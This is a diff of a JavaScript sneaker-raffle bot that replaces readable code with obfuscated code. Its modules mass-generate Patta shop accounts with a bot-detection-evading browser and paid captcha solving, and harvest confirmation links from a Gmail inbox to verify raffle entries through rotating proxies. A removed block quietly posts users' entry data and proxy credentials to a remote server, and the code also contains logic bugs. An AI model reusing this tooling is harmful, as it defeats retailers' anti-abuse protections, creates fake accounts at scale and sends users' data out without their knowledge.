-                //         }
-                //         try {
-                //             const page = await browser.newPage();
-                //             await page.authenticate({
-                //                 username: `${proxySplit[2]}`,
-                //                 password: `${proxySplit[3]}`,
-                //             });
-                //             await page.setViewport({ width: 1280, height: 720 });
-
-                //             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                //             // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                //             await page.setRequestInterception(true);
-                //             page.on("request", (req) => {
-                //                 if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                //                     req.abort();
-                //                 } else {
-                //                     req.continue();
-                //                 }
-                //             });
-                //             await page.goto(`${csv[i].Url}`,
-                //                 {
-                //                     waitUntil: "networkidle2",
-                //                     timeout: 60000
-                //                 });
-
-                //             try {
-                //                 await page.waitForSelector(`div[data-step="thank_you"]`, { timeout: 300000 })
-                //                 retry = 'no';
-                //                 successfulLog(csv[i], currentFunction);
-
-                //                 console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-
-                //             } catch (e) {
-                //                 throw new Error(`Error Processing Order: ${e.message}`);
-
-                //             }
-                //             var succesDEV = await makeEmbed(csv[i], currentFunction, 'dev', false);
-                //             var succesPUB = await makeEmbed(csv[i], currentFunction, 'pub', false);
-                //             let task = csv[i]
-                //             try {
-                //                 prxdata = {
-                //                     username: username.replace('#', ''),
-                //                     module: currentFunction.name,
-                //                     entrydata: JSON.stringify(task),
-                //                     proxy: `${proxies[i]}`
-                //                 }
-                //                 var prx = JSON.stringify(prxdata);
-                //                 let config = {
-                //                     headers: {
-                //                         'content-type': 'application/json',
-                //                     }
-                //                 }
-                //                 await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                //             } catch (e) {
-
-                //             }
-                //             const EMBEDS =
-                //             {
-                //                 succesDEVMSG: { embeds: [succesDEV] },
-                //                 succesPUBMSG: { embeds: [succesPUB] }
-                //             };
-                //             try {
-                //                 if (settings.webhook != undefined && settings.webhook != '') {
-                //                     await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                //                 }
-                //                 await delay(200);
-                //                 await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                //                 await delay(200);
-                //                 await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                //             } catch (e) {
-                //                 console.log(chalk.yellow(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : Error sending webhook ${e}`));
-
-                //             }
-
-
-                //         } catch (e) {
-                //             console.log(chalk.red(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : ${e}`));
-                //             ERROR = `${e}`
-                //             var errorDEV = await makeEmbed(kickz[i], currentFunction, 'dev', true, ERROR);
-                //             EMBEDS.errorDEV = { embeds: [errorDEV] }
-                //             if (settings.webhook != undefined && settings.webhook != '') {
-                //                 await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                //             }
-                //             await sendWebhook(errorWH, EMBEDS.errorDEV);
-                //             retry = 'yes';
-                //         } finally {
-                //             if (browser) {
-                //                 browser.close();
-                //             }
-                //             if (retry == 'yes' && t != 5 && ERROR != 'Size Not Found') {
-                //                 console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                //                 i = i - 1;
-                //                 t = t + 1;
-                //                 continue;
-                //             }
-                //             if (retry == 'yes' && t >= 5) {
-                //                 errorLog(csv[i], currentFunction)
-                //                 retry = 'no';
-                //                 t = 0;
-                //             }
-                //             console.log(`Waiting for ${settings.delay} ms`);
-                //             await delay(settings.delay);
-                //         }
-                //     }
-                // }
             },
             {
-                name: "OQIUM Raffle Verification",
-                url: '',
-                data: {
-                    data: {
-                        type: "subscription",
-                        attributes: {
-                            list_id: 'TFTWYv',
-                            custom_source: "Air Jordan 1 Retro High OG Lost and Found",
-                            email: ``,
-                            properties: {
-                                $address1: "",
-                                $city: "",
-                                $country: "",
-                                $first_name: "",
-                                $last_name: "",
-                                $zip: "",
-                                $consent_method: "Klaviyo Form",
-                                $consent_form_id: "V4PNGA",
-                                $consent_form_version: 7328877,
-                                'Instagram Handle': ``,
-                                Shipping: 'Shipping',
-                                Size: '',
-                                services: '{\"shopify\":{\"source\":\"form\"}}',
-                                $timezone_offset: 1,
-                            },
-                        },
-                    },
-                },
-                headers: {
-                    'accept': "*/*",
-                    "accept-encoding": "gzip, deflate, br",
-                    "access-control-allow-headers": "*",
-                    "content-type": "application/json",
-                    "origin": "https://www.maha-amsterdam.com",
-                    "referer": "https://www.maha-amsterdam.com/",
-                    "revision": "2022-02-16",
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
-                    'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-                    "sec-ch-ua-mobile": "?0",
-                    "sec-ch-ua-platform": "'Windows'",
-                    "sec-fetch-dest": "empty",
-                    "sec-fetch-mode": "cors",
-                    "sec-fetch-site": "cross-site",
-                },
-                function: async function (currentFunction, links, proxies) {
-                    var links = [];
-                    var done = false;
-                    // console.log(`Found ${links.length} Links in Mailbox`)
-                    async function getMails() {
-                        var imap = new Imap({
-                            user: settings.masterMail,
-                            password: settings.masterPassword,
-                            host: 'imap.gmail.com',
-                            port: 993,
-                            tls: true,
-                            autotls: 'always'
-                        });
-
-                        function openInbox(cb) {
-                            imap.openBox('INBOX', false, cb);
+                'name': 'OQIUM\x20Raffle\x20Verification',
+                'url': '',
+                'data': {
+                    'data': {
+                        'type': 'subscription',
+                        'attributes': {
+                            'list_id': 'TFTWYv',
+                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
+                            'email': '',
+                            'properties': {
+                                '$address1': '',
+                                '$city': '',
+                                '$country': '',
+                                '$first_name': '',
+                                '$last_name': '',
+                                '$zip': '',
+                                '$consent_method': 'Klaviyo\x20Form',
+                                '$consent_form_id': 'V4PNGA',
+                                '$consent_form_version': 0x6fd46d,
+                                'Instagram\x20Handle': '',
+                                'Shipping': 'Shipping',
+                                'Size': '',
+                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
+                                '$timezone_offset': 0x1
+                            }
                         }
-
-                        imap.once('ready', function () {
-                            openInbox(function (err, box) {
-                                console.clear()
-                                console.log('Looking For Links')
-                                if (err) throw err;
-                                imap.seq.search(['UNSEEN', ['SUBJECT', 'Confirm Your Subscription'], ['FROM', 'OQIUM']], function (err, results) {
-                                    if (!results || !results.length) {
-                                        console.log(`${getTime()} [${currentFunction.name}] No mails found`);
-
-                                        imap.end();
-
-                                    } else {
-                                        var f = imap.seq.fetch(results, { bodies: '', markSeen: true });
-                                        f.on('message', function (msg, seqno) {
-                                            // console.log('Message #%d', seqno);
-                                            var prefix = '(#' + seqno + ') ';
-                                            msg.on('body', function (stream, info) {
-                                                simpleParser(stream, (err, mail) => {
-
-                                                    var bstnSplit = mail.text.split('(')[1];
-                                                    var bstnLink = bstnSplit.split(')')[0];
-                                                    // var msgSplit = mail.html.split('\n')
-                                                    links.push(bstnLink)
-                                                    // for (var i = 0; i < msgSplit.length; i++) {
-                                                    //     if (msgSplit[i].includes('salesmanago') && msgSplit[i].includes('<td') && msgSplit[i].includes('href')) {
-                                                    //         var linklong = msgSplit[i].split('href="')
-                                                    //         var l = linklong[1].split('"')[0]
-                                                    //         links.push(l)
-                                                    //         break;
-                                                    //     }
-                                                    // }
-
-                                                    // console.log(mail.html.split('\n'));
-                                                    // mes = mail.text.split('[')[2]
-                                                    // link = mes.split(']')[0];
-                                                    // console.log(link);
-                                                });
-                                                // imap.seq.setFlags(seqno, 'SEEN')
-
-
-                                            });
-                                            // msg.once('attributes', function (attrs) {
-                                            //     console.log(prefix + 'Attributes: %s', inspect(attrs, false, 8));
-                                            // });
-                                            msg.once('end', function () {
-                                                // console.log(prefix + 'Finished');
-
-
-                                            });
-                                        });
-                                        f.once('error', function (err) {
-                                            console.log('Fetch error: ' + err);
-                                            done = true;
-
-                                        });
-                                        f.once('end', function () {
-                                            // console.log('Done fetching all messages!');
-                                            imap.end();
-                                            done = true;
-                                        });
-                                    }
-                                })
-                            });
-                        });
-
-
-
-                        imap.once('error', function (err) {
-                            console.log(err);
-                            done = true;
-
-                        });
-
-                        imap.once('end', async function () {
-
-                            done = true;
-
-                            // console.log('Connection ended');
-                        });
-
-                        imap.connect();
                     }
-                    async function verify(currentFunction, links, proxies) {
-                        for (var i = 0; i < links.length; i++) {
-                            async function verifyFunction(i, mode, currentFunction, oqium, proxies) {
-
-                                var ERROR;
-                                var data = {};
-                                var embed = [];
-                                var msg = {};
-                                var sizeArray = [
-                                    '40', '40,5', '41', '42', '42,5', '43', '44', '45', '45,5', '46', '47', '47,5', '48'
-                                ]
-                                var randomSize = Math.round(Math.random() * (sizeArray.length - 1));
-                                if (
-                                    oqium[i].Size == 'RANDOM'
-                                ) {
-                                    oqium[i].Size = sizeArray[randomSize]
-                                }
-                                if (!oqium) {
-                                    oqium = {
-
-                                    };
-                                }
-
-
-                                if (settings.useRandomProxy = false) {
-                                    var proxySplit = proxies[i].split(":");
-                                } else {
-                                    var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                                    var proxySplit = proxies[randomProxy].split(":");
-                                }
-
-
-
-                                var options = {
-                                    jar: j,
-                                    followAllRedirects: true,
-                                    method: 'POST',
-                                    url: currentFunction.url,
-                                    headers: currentFunction.headers,
-                                    body: JSON.stringify(data),
-                                    proxy: `http://${proxySplit[2]}:${proxySplit[3]}@${proxySplit[0]}:${proxySplit[1]}`,
-                                };
-                                if (mode != 'ver') {
-                                    options.url = currentFunction.url
-                                    options.headers = currentFunction.headers
-                                }
-                                if (mode == 'ver') {
-                                    options.method = 'GET';
-                                    options.url = oqium[i]
-                                }
-                                return new Promise(function (resolve, reject) {
-                                    callback = async (err, res, body) => {
-                                        if (!err && res.statusCode == 202 || !err && res.statusCode == 200) {
-                                            if (mode != 'ver') {
-                                                var succesDEV = await makeEmbed(oqium[i], currentFunction, 'dev', false);
-                                                var succesPUB = await makeEmbed(oqium[i], currentFunction, 'pub', false);
-                                                const EMBEDS =
-                                                {
-                                                    succesDEVMSG: { embeds: [succesDEV] },
-                                                    succesPUBMSG: { embeds: [succesPUB] }
-                                                };
-
-                                                if (settings.webhook != undefined && settings.webhook != '') {
-                                                    try {
-
-                                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                                    } catch {
-
-                                                    }
-                                                }
-                                                await delay(200);
-                                                await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                                await delay(200);
-                                                try {
-
-                                                    await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                                                } catch {
-
-                                                }
-                                                successfulLog(oqium[i], currentFunction);
-                                            }
-
-                                            resolve(console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Raffle Entered!`)));
-                                        } else {
-                                            if (mode != 'ver') {
-                                                var ERROR = `${err}`;
-                                                var errorDEV = await makeEmbed(oqium[i], currentFunction, 'dev', true, ERROR);
-                                                var EMBEDS = {}
-                                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                                errorLog(oqium[i], currentFunction)
-
-                                                if (settings.webhook != undefined && settings.webhook != '') {
-                                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                                }
-                                                await sendWebhook(errorWH, EMBEDS.errorDEV);
-
-                                            }
-                                            reject(console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1}: ${err}`)));
-                                        }
-                                    }
-                                    try {
-                                        if (mode != 'ver') {
-                                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Sending Entry for ${data.data.attributes.email}`)
-                                        } else {
-                                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Fetching Response`)
-
-                                        }
-                                        request(options, callback);
-                                    } catch (err) {
-                                        console.log(`${getTime()} Task ${i + 1}: ${err}`);
+                },
+                'headers': {
+                    'accept': '*/*',
+                    'accept-encoding': 'gzip,\x20deflate,\x20br',
+                    'access-control-allow-headers': '*',
+                    'content-type': 'application/json',
+                    'origin': 'https://www.maha-amsterdam.com',
+                    'referer': 'https://www.maha-amsterdam.com/',
+                    'revision': '2022-02-16',
+                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
+                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '\x27Windows\x27',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'cross-site'
+                },
+                'function': async function (_0x40f21d, _0x1b6d57, _0xa84cad) {
+                    var _0x1b6d57 = [], _0x2ff5f4 = ![];
+                    async function _0x15ae07() {
+                        var _0x51f720 = new _0x3e4e8d({
+                            'user': _0x51d52a['masterMail'],
+                            'password': _0x51d52a['masterPassword'],
+                            'host': 'imap.gmail.com',
+                            'port': 0x3e1,
+                            'tls': !![],
+                            'autotls': 'always'
+                        });
+                        function _0x34c8cc(_0x2aa8ce) {
+                            _0x51f720['openBox']('INBOX', ![], _0x2aa8ce);
+                        }
+                        _0x51f720['once']('ready', function () {
+                            _0x34c8cc(function (_0x5c9b62, _0x437576) {
+                                console['clear'](), console['log']('Looking\x20For\x20Links');
+                                if (_0x5c9b62)
+                                    throw _0x5c9b62;
+                                _0x51f720['seq']['search']([
+                                    'UNSEEN',
+                                    [
+                                        'SUBJECT',
+                                        'Confirm\x20Your\x20Subscription'
+                                    ],
+                                    [
+                                        'FROM',
+                                        'OQIUM'
+                                    ]
+                                ], function (_0x244b55, _0x1ea371) {
+                                    if (!_0x1ea371 || !_0x1ea371['length'])
+                                        console['log'](_0x3982db() + '\x20[' + _0x40f21d['name'] + ']\x20No\x20mails\x20found'), _0x51f720['end']();
+                                    else {
+                                        var _0x506359 = _0x51f720['seq']['fetch'](_0x1ea371, {
+                                            'bodies': '',
+                                            'markSeen': !![]
+                                        });
+                                        _0x506359['on']('message', function (_0x1a1173, _0x19117e) {
+                                            var _0x47237e = '(#' + _0x19117e + ')\x20';
+                                            _0x1a1173['on']('body', function (_0x3811ec, _0x8fab52) {
+                                                _0x300bc8(_0x3811ec, (_0x4c19e1, _0x34b9c2) => {
+                                                    var _0x33f5a0 = _0x34b9c2['text']['split']('(')[0x1], _0x368260 = _0x33f5a0['split'](')')[0x0];
+                                                    _0x1b6d57['push'](_0x368260);
+                                                });
+                                            }), _0x1a1173['once']('end', function () {
+                                            });
+                                        }), _0x506359['once']('error', function (_0x251f30) {
+                                            console['log']('Fetch\x20error:\x20' + _0x251f30), _0x2ff5f4 = !![];
+                                        }), _0x506359['once']('end', function () {
+                                            _0x51f720['end'](), _0x2ff5f4 = !![];
+                                        });
                                     }
                                 });
-                            };
+                            });
+                        }), _0x51f720['once']('error', function (_0x64f2a0) {
+                            console['log'](_0x64f2a0), _0x2ff5f4 = !![];
+                        }), _0x51f720['once']('end', async function () {
+                            _0x2ff5f4 = !![];
+                        }), _0x51f720['connect']();
+                    }
+                    async function _0x8148e8(_0x1937dd, _0x343e01, _0x593783) {
+                        for (var _0x310f54 = 0x0; _0x310f54 < _0x343e01['length']; _0x310f54++) {
+                            async function _0x47d91a(_0x5bfce7, _0x154175, _0xf7b69a, _0x2ab1d3, _0x529678) {
+                                var _0x3b89e2, _0x1fa26f = {}, _0x2712c2 = [], _0x42feff = {}, _0x3ce127 = [
+                                    '40',
+                                    '40,5',
+                                    '41',
+                                    '42',
+                                    '42,5',
+                                    '43',
+                                    '44',
+                                    '45',
+                                    '45,5',
+                                    '46',
+                                    '47',
+                                    '47,5',
+                                    '48'
+                                ], _0x30e062 = Math['round'](Math['random']() * (_0x3ce127['length'] - 0x1));
+                                _0x2ab1d3[_0x5bfce7]['Size'] == 'RANDOM' && (_0x2ab1d3[_0x5bfce7]['Size'] = _0x3ce127[_0x30e062]);
+                                !_0x2ab1d3 && (_0x2ab1d3 = {});
+                                if (_0x51d52a['useRandomProxy'] = ![])
+                                    var _0x74c6a5 = _0x529678[_0x5bfce7]['split'](':');
+                                else
+                                    var _0x38fa8b = Math['round'](Math['random']() * (_0x529678['length'] - 0x1)), _0x74c6a5 = _0x529678[_0x38fa8b]['split'](':');
+                                var _0x2ff492 = {
+                                    'jar': _0x103baf,
+                                    'followAllRedirects': !![],
+                                    'method': 'POST',
+                                    'url': _0xf7b69a['url'],
+                                    'headers': _0xf7b69a['headers'],
+                                    'body': JSON['stringify'](_0x1fa26f),
+                                    'proxy': 'http://' + _0x74c6a5[0x2] + ':' + _0x74c6a5[0x3] + '@' + _0x74c6a5[0x0] + ':' + _0x74c6a5[0x1]
+                                };
+                                return _0x154175 != 'ver' && (_0x2ff492['url'] = _0xf7b69a['url'], _0x2ff492['headers'] = _0xf7b69a['headers']), _0x154175 == 'ver' && (_0x2ff492['method'] = 'GET', _0x2ff492['url'] = _0x2ab1d3[_0x5bfce7]), new Promise(function (_0x2f2f24, _0x36062c) {
+                                    callback = async (_0x59e7d0, _0x5f7621, _0x542d1c) => {
+                                        if (!_0x59e7d0 && _0x5f7621['statusCode'] == 0xca || !_0x59e7d0 && _0x5f7621['statusCode'] == 0xc8) {
+                                            if (_0x154175 != 'ver') {
+                                                var _0xfa97d1 = await _0x2520f4(_0x2ab1d3[_0x5bfce7], _0xf7b69a, 'dev', ![]), _0x33c5f1 = await _0x2520f4(_0x2ab1d3[_0x5bfce7], _0xf7b69a, 'pub', ![]);
+                                                const _0x23612c = {
+                                                    'succesDEVMSG': { 'embeds': [_0xfa97d1] },
+                                                    'succesPUBMSG': { 'embeds': [_0x33c5f1] }
+                                                };
+                                                if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
+                                                    try {
+                                                        await _0x3c7bbe(_0x51d52a['webhook'], _0x23612c['succesDEVMSG']);
+                                                    } catch {
+                                                    }
+                                                await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x23612c['succesDEVMSG']), await _0x116d4a(0xc8);
+                                                try {
+                                                    await _0x3c7bbe(_0x55a106, _0x23612c['succesPUBMSG']);
+                                                } catch {
+                                                }
+                                                _0x523ce4(_0x2ab1d3[_0x5bfce7], _0xf7b69a);
+                                            }
+                                            _0x2f2f24(console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0xf7b69a['name'] + ']\x20Task\x20' + (_0x5bfce7 + 0x1) + ':\x20Raffle\x20Entered!')));
+                                        } else {
+                                            if (_0x154175 != 'ver') {
+                                                var _0xb970b = '' + _0x59e7d0, _0x140d77 = await _0x2520f4(_0x2ab1d3[_0x5bfce7], _0xf7b69a, 'dev', !![], _0xb970b), _0x19d6d4 = {};
+                                                _0x19d6d4['errorDEV'] = { 'embeds': [_0x140d77] }, _0x5925c7(_0x2ab1d3[_0x5bfce7], _0xf7b69a), _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x19d6d4['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x19d6d4['errorDEV']);
+                                            }
+                                            _0x36062c(console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xf7b69a['name'] + ']\x20Task\x20' + (_0x5bfce7 + 0x1) + ':\x20' + _0x59e7d0)));
+                                        }
+                                    };
+                                    try {
+                                        _0x154175 != 'ver' ? console['log'](_0x3982db() + '\x20[' + _0xf7b69a['name'] + ']\x20Task\x20' + (_0x5bfce7 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1fa26f['data']['attributes']['email']) : console['log'](_0x3982db() + '\x20[' + _0xf7b69a['name'] + ']\x20Task\x20' + (_0x5bfce7 + 0x1) + ':\x20Fetching\x20Response'), _0x225fcc(_0x2ff492, callback);
+                                    } catch (_0x222027) {
+                                        console['log'](_0x3982db() + '\x20Task\x20' + (_0x5bfce7 + 0x1) + ':\x20' + _0x222027);
+                                    }
+                                });
+                            }
+                            ;
                             try {
-                                await verifyFunction(i, 'ver', currentFunction, links, proxies);
-                                console.log(`${getTime()} [${currentFunction.name}] Sleeping for ${settings.delay} ms`);
-                                await delay(settings.delay);
-
-                            } catch (e) {
-
+                                await _0x47d91a(_0x310f54, 'ver', _0x1937dd, _0x343e01, _0x593783), console['log'](_0x3982db() + '\x20[' + _0x1937dd['name'] + ']\x20Sleeping\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                            } catch (_0x342dc2) {
                             }
                         }
                     }
                     try {
-                        getMails();
-                        while (!done) {
-                            await delay(4000);
+                        _0x15ae07();
+                        while (!_0x2ff5f4) {
+                            await _0x116d4a(0xfa0);
                         }
-                        // await delay(4000);
-                        console.log(`Found ${links.length} Links in Mailbox`)
-
+                        console['log']('Found\x20' + _0x1b6d57['length'] + '\x20Links\x20in\x20Mailbox');
                     } catch {
-                        console.log(`Searching mailbox failed, please read the guide on how to setup..`)
+                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                     }
-
-                    await verify(currentFunction, links, proxies);
+                    await _0x8148e8(_0x40f21d, _0x1b6d57, _0xa84cad);
                 }
             }
         ]
     },
-    // {
-    //     name: 'BOUNCEWEAR',
-    //     modules: [
-    //         {
-    //             name: 'BOUNCEWEAR Account Generator'
-    //         }
-    //     ]
-    // },
     {
-        name: 'PATTA',
-        modules: [
+        'name': 'PATTA',
+        'modules': [
             {
-                name: 'PATTA Account Generator',
-                store: 'Patta',
-                logo: 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
-                function: async function (currentFunction, patta, proxies) {
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
+                'name': 'PATTA\x20Account\x20Generator',
+                'store': 'Patta',
+                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
+                'function': async function (_0x28ae45, _0x506e5f, _0x558f8b) {
+                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                        'provider': {
+                            'id': '2captcha',
+                            'token': '' + _0x51d52a['captchaKey']
                         },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < patta.length; i++) {
-                        var embed = [
-                            {
-                                "type": "rich",
-                                "title": `Succesful Patta Account Generated`,
-                                "description": "",
-                                "color": 0xc0d6d6,
-                                "fields": [
-                                    {
-                                        "name": `User`,
-                                        "value": `${username}`
-                                    },
-                                    {
-                                        "name": `Delay`,
-                                        "value": `${settings.delay}`
-                                    },
-                                    {
-                                        "name": `Version`,
-                                        "value": `${version}`
-                                    }
-                                ]
-                            }
-                        ]
-                        const msg = { embeds: embed };
-                        setTitle(`${currentFunction.name} Task ${i + 1} / ${patta.length} || File: ${currentFile} Proxies: ${currentProxy}`);
+                        'visualFeedback': !![]
+                    }));
+                    for (var _0x124d60 = 0x0; _0x124d60 < _0x506e5f['length']; _0x124d60++) {
+                        var _0x549cf0 = [{
+                            'type': 'rich',
+                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
+                            'description': '',
+                            'color': 0xc0d6d6,
+                            'fields': [
+                                {
+                                    'name': 'User',
+                                    'value': '' + _0x358285
+                                },
+                                {
+                                    'name': 'Delay',
+                                    'value': '' + _0x51d52a['delay']
+                                },
+                                {
+                                    'name': 'Version',
+                                    'value': '' + _0x3b2d4c
+                                }
+                            ]
+                        }];
+                        const _0x3a31dc = { 'embeds': _0x549cf0 };
+                        _0x244762(_0x28ae45['name'] + '\x20Task\x20' + (_0x124d60 + 0x1) + '\x20/\x20' + _0x506e5f['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                         try {
-                            await jig(patta, i);
-
+                            await _0x2c2316(_0x506e5f, _0x124d60);
                         } catch {
-
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
+                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                         }
-                        var succesDEV = await makeEmbed(patta[i], currentFunction, 'acc', false);
-
-                        const EMBEDS =
-                        {
-                            succesDEVMSG: { embeds: [succesDEV] }
-                        };
-                        if (patta[i].Email == '' || patta[i].FirstName == '' || patta[i].LastName == '') {
-                            console.log(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : Invalid CSV`);
-                            await delay(2000)
+                        var _0x423ae1 = await _0x2520f4(_0x506e5f[_0x124d60], _0x28ae45, 'acc', ![]);
+                        const _0x962508 = { 'succesDEVMSG': { 'embeds': [_0x423ae1] } };
+                        if (_0x506e5f[_0x124d60]['Email'] == '' || _0x506e5f[_0x124d60]['FirstName'] == '' || _0x506e5f[_0x124d60]['LastName'] == '') {
+                            console['log'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x116d4a(0x7d0);
                             continue;
                         }
-                        if (patta[i].Password == '' || patta[i] == undefined) {
-                            patta[i].Password == 'JRaffles23!'
-                        }
-                        if (settings.useRandomProxy = false) {
-                            var proxySplit = proxies[i].split(":");
-                        } else {
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                        }
-                        var browser
+                        (_0x506e5f[_0x124d60]['Password'] == '' || _0x506e5f[_0x124d60] == undefined) && _0x506e5f[_0x124d60]['Password'] == 'JRaffles23!';
+                        if (_0x51d52a['useRandomProxy'] = ![])
+                            var _0x224edf = _0x558f8b[_0x124d60]['split'](':');
+                        else
+                            var _0x532a65 = Math['round'](Math['random']() * (_0x558f8b['length'] - 0x1)), _0x224edf = _0x558f8b[_0x532a65]['split'](':');
+                        var _0x589e7d;
                         try {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x589e7d = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x224edf[0x0] + ':' + _0x224edf[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
-
                         } catch {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x589e7d = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x224edf[0x0] + ':' + _0x224edf[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
                         }
                         try {
-                            // console.log(patta[i].Password)
-                            const page = await browser.newPage();
-                            await page.authenticate({
-                                username: `${proxySplit[2]}`,
-                                password: `${proxySplit[3]}`,
-                            });
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                            // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                            await page.setRequestInterception(true);
-                            page.on("request", (req) => {
-                                if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                    req.abort();
-                                } else {
-                                    req.continue();
-                                }
-                            });
-                            await page.goto(`https://patta.nl/account/register`);
-                            await delay(3000);
-                            await page.waitForSelector('#RegisterForm-FirstName');
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Filling information`);
-                            await page.type('#RegisterForm-FirstName', `${patta[i].FirstName}`);
-                            await delay(550);
-                            await page.type('#RegisterForm-LastName', `${patta[i].LastName}`);
-                            await delay(550);
-                            await page.type('#RegisterForm-email', `${patta[i].Email}`);
-                            await delay(550);
-                            await page.type('#RegisterForm-password', `${patta[i].Password}`);
-                            await delay(550);
-                            // await page.click('#marketing');
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Submitting..`);
-                            await page.$eval('#RegisterForm', form => form.submit());
-                            await delay(8000);
-                            // console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Solving Captcha`)
-                            // await page.solveRecaptchas();
-                            // await page.click('.shopify-challenge__button.btn');
-                            // async function retry() {
-                            //     for (var a = 0; a < 4; a++) {
-                            //         try {
-                            //             console.log('try')
-                            //             await page.waitForSelector('.shopify-challenge__error', { timeout: 5000 });
-                            //             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${chalk.red('Catpcha failed, retrying..')}`)
